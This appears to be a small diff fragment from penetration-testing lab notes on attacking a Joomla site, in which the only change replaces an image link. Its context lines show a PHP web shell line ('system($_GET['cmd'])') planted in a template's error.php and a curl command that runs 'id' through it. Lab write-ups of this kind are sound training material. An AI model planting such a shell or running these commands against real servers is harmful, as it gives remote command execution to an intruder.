@@ -29,5 +29,5 @@ system($_GET['cmd']);
 ```
 curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
 ```
-![[Pasted image 20260413143237.png]]
+![joomla](../Images/joomla.png)
 
